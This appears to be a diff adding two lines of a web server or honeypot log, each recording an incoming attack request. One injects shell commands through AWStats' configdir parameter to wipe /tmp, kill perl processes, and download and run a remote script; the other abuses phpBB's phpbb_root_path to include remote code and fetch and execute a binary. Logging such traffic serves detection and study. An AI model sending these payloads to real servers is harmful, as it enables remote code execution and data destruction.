@@ -1,0 +1,2 @@
+[00:30:54] HTTP request from client: GET /stats/cgi-bin/awstats.pl?configdir=|echo%20;cd%20/tmp;rm%20-rf%20*;killall%20-9%20perl;wget%20members.lycos.co.uk/revage/a.txt;perl%20a.txt;echo%20;rm%20-rf%20a.txt*;echo|
+[00:30:54] HTTP request from client: GET /Forums/admin/admin_styles.php?phpbb_root_path=http://209.136.48.69/cmd.dat?&cmd=cd%20/tmp;wget%20209.136.48.69/cbac;chmod%20744%20cbac;./cbac;echo%20YYY;echo
